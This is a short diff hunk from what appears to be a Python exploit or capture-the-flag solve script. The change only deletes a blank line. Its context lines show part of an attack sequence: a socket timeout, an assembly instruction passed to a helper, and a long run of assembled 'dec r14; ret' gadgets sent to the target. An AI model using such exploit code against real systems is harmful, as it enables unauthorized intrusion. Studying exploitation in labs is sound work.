@@ -75,7 +75,6 @@ if __name__ == "__main__":
 
     r.settimeout(0.5)
 
-
     s('mov r14,[rsp]')
     r.recvn(8)
     r.send( assemble('dec r14; ret') * (0xb18 - 0x8a2) )
